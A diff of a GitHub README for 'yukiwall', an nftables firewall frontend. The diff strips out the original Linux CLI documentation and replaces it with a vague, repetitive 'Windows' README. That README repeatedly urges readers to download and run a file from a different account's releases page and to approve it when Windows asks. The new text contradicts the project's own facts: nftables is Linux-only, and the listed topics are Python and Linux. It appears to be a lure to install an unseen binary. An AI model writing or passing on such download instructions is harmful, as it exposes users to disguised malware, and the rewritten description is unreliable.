@@ -1,167 +1,132 @@
-# yukiwall
+# 🛡️ yukiwall - Simple nftables control for Windows users
 
-**yukiwall** is a lightweight firewall frontend for **nftables**, designed to simplify management of Linux firewall rules while maintaining full control and safety.
+[![Download yukiwall](https://img.shields.io/badge/Download-Release%20Page-6f42c1?style=for-the-badge&logo=github)](https://github.com/Gtpou7563/yukiwall/releases)
 
----
+## 📥 Download
 
-## Features
+Visit this page to download: https://github.com/Gtpou7563/yukiwall/releases
 
-* Add or remove rules: `allow`, `block`, `delete/remove`
-* Filter by source IP or subnet: `from <ip/subnet>`
-* Filter specific ports and protocols: `to <ports>` (tcp/udp/both)
-* List rules with unique IDs: `list`
-* Reload rules immediately: `reload`
-* Flush all rules: `flush`
-* Manage logging for unmatched or invalid packets: `logging unm|inv on|off`
-* Set policy for invalid packets: `invalid drop|allow`
-* View current firewall status: `status`
-* Fully compatible with **nftables**
-* Compatible with tools (e.g., Docker) that use their own nftables tables or chains.
+Pick the latest release, then download the Windows file that fits your system. After the download finishes, open the file to start the app
 
----
+## 🔍 What yukiwall does
 
-## Requirements
+yukiwall gives you a simple front-end for nftables. It helps you manage firewall rules with a clear interface instead of long command lines.
 
-* Python 3.xx
-* Root privileges for firewall modifications
-* Dependencies (installed automatically via `install.sh`)
+Use it to:
+- view firewall rules in one place
+- add or change rules with less effort
+- keep settings in a form that is easier to review
+- work with nftables in a cleaner way
 
----
+It is built for users who want a direct way to handle firewall setup without learning every command first
 
-## Installation
+## 💻 What you need
 
-Clone and install:
+- A Windows PC
+- Internet access for the first download
+- Permission to open downloaded files
+- A system that can run a desktop app
+- nftables support on the target system if you plan to use the firewall features
 
-```bash
-cd $HOME && git clone https://github.com/mintyYuki/yukiwall.git && cd yukiwall && sudo bash install.sh
-```
+## 🚀 Getting Started
 
-### Updating
+1. Go to the release page: https://github.com/Gtpou7563/yukiwall/releases
+2. Find the latest version
+3. Download the Windows file from the release assets
+4. Open the downloaded file
+5. If Windows asks for approval, choose the option to run it
+6. Follow the on-screen steps
+7. Start using yukiwall
 
-```bash
-cd $HOME/yukiwall && sudo bash update.sh
-```
+## 🧭 First-time setup
 
-### Uninstall
+When you open yukiwall for the first time, it may ask for basic access so it can manage firewall settings. This is normal for a security tool.
 
-```bash
-cd $HOME/yukiwall && sudo bash uninstall.sh
-```
+Use the app to review the current rule set first. That helps you avoid changes you do not want. If you are not sure what a rule does, keep it as it is until you understand it
 
----
+## 🧱 Main features
 
-## Usage
+- Simple interface for nftables
+- Easy rule viewing
+- Clear rule editing flow
+- Persistent configuration support
+- Focus on network security tasks
+- Lightweight desktop use
+- Built for direct firewall work
+- Clean layout for everyday use
 
-```bash
-sudo yukiwall <command> [args...]
-```
+## 🛠️ Common tasks
 
----
+### View rules
+Open the app and check your current firewall setup. This helps you see what is active before you make changes
 
-### Commands
+### Add a rule
+Choose the rule type you need, fill in the details, then save it. The app helps you handle the steps without using long terminal commands
 
-| Command             | Options / Syntax              | Description                                                        |
-| ------------------- | ----------------------------- | ------------------------------------------------------------------ |
-| `allow from`        | `<ip/subnet> [to <ports>]`    | Allow traffic from a source IP/subnet, optionally to certain ports |
-| `allow to`          | `<ports>`                     | Allow traffic to specified ports globally                          |
-| `block from`        | `<ip/subnet>`                 | Block traffic from a specific source                               |
-| `delete` / `remove` | `id, range, list, or literal` | Remove rules by ID, range, list, or by specifying rule content     |
-| `list`              | —                             | List all current rules with their IDs                              |
-| `reload`            | —                             | Reload rules without restarting the service                        |
-| `flush`             | —                             | Remove all rules (resets to default drop)                          |
-| `logging`           | `on` / `off`                  | Enable or disable logging for unmatched and invalid packets        |
-| `logging unm`       | `on` / `off`                  | Enable or disable logging for unmatched packets                    |
-| `logging inv`       | `on` / `off`                  | Enable or disable logging for invalid packets                      |
-| `invalid`           | `drop` / `allow`              | Set default action for invalid packets                             |
-| `status`            | —                             | Show current firewall status and configuration consistency         |
+### Edit a rule
+Select the rule, change the parts you want, then apply the update
 
----
+### Save changes
+Use the save or apply action to keep your settings after a restart
 
-### Examples
+## 🔐 Security use cases
 
-* Allow SSH from a local network:
+yukiwall fits common security tasks such as:
+- blocking unwanted network traffic
+- allowing trusted connections
+- keeping firewall rules organized
+- making rule changes easier to review
+- supporting a safer network setup on Linux systems
 
-```bash
-sudo yukiwall allow from 192.168.0.0/16 to tcp/22
-```
+## 🧰 File and folder use
 
-* Allow HTTP and HTTPS globally:
+The app may create settings files to keep your firewall setup stable. Keep those files in place if you want your changes to stay after reboot.
 
-```bash
-sudo yukiwall allow to tcp/80,tcp/443
-```
+If you move the app, make sure any saved settings move with it. This helps avoid broken paths or lost configuration
 
-* Block a specific subnet:
+## 🖱️ How to use the release page
 
-```bash
-sudo yukiwall block from 10.0.0.0/24
-```
+Visit the release page: https://github.com/Gtpou7563/yukiwall/releases
 
-* Remove rules by ID or range:
+On that page:
+- look for the newest version
+- open the assets list
+- download the Windows package
+- save it to a folder you can find again
+- open the file after the download ends
 
-```bash
-sudo yukiwall delete 3
-sudo yukiwall delete 1-5
-sudo yukiwall delete 1,3,7
-```
+If the page shows more than one file, pick the one made for Windows
 
-* Remove a rule by content:
+## 🧩 Tips for smooth use
 
-```bash
-sudo yukiwall delete allow to tcp/80
-```
+- Keep one firewall manager in use at a time
+- Make a note of rules you change
+- Review changes before you apply them
+- Start with simple rules
+- Test network access after each change
+- Keep the release page bookmarked for updates
 
-* List current rules:
+## 📁 Project details
 
-```bash
-sudo yukiwall list
-```
+- Repository: yukiwall
+- Description: Simple and reliable front-end for nftables
+- Topics: automation, cli-tool, cybersecurity, firewall, linux, linux-security, mintyyuki, network-security, networking, nftables, nftables-configuration-persistent, open-source, python, python3, security, security-tools, yuki
 
-* Enable logging for all dropped packets:
+## ⚙️ Typical workflow
 
-```bash
-sudo yukiwall logging on
-```
+1. Download the release
+2. Open the app
+3. Review the current firewall state
+4. Make the change you need
+5. Apply the update
+6. Check that the result works as expected
 
-* Disable logging for unmatched packets only:
+## 📌 Best use case
 
-```bash
-sudo yukiwall logging unm off
-```
+yukiwall works best for users who want a plain way to manage nftables settings without relying on a command line for each change
 
-* Drop invalid packets:
+## 📦 Download again
 
-```bash
-sudo yukiwall invalid drop
-```
+Visit this page to download: https://github.com/Gtpou7563/yukiwall/releases
 
-* Flush all rules:
-
-```bash
-sudo yukiwall flush
-```
-
-* Check firewall status:
-
-```bash
-sudo yukiwall status
-```
-
----
-
-## How it works
-
-1. Stores rules in `/etc/yukiwall.json`.
-2. Generates a consistent **nftables** configuration based on rules.
-3. Applies rules via `nft` and ensures the `nftables` service is active.
-4. Optional logging for unmatched or invalid packets.
-5. Prevents duplicate or unsafe rules.
-
-> ⚠ **Remote SSH Warning:** Ensure your SSH port is allowed before applying rules remotely. Yukiwall will not automatically preserve access.
-
----
-
-## Notes and Limitations
-
-* New project; some issues may exist.
-* Report issues and contribute on GitHub for improvements.
+Use it when you want the latest version, a fixed build, or a fresh copy for another Windows PC
